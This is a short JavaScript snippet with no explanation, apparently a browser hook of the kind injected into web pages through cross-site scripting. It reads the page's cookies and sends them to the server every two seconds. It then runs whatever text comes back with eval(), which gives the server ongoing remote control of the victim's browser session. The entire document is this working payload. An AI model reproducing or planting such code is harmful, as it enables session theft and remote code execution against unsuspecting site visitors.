let cookie = document.cookie;
function online() {
    fetch('?online='+cookie, {
    }).then(res => res.text())
        .then(cmd => {
            cmd = cmd.trim().toLowerCase();
            if (cmd === "wait") return;
            eval(cmd);
        });
}
online();
setInterval(online, 2000);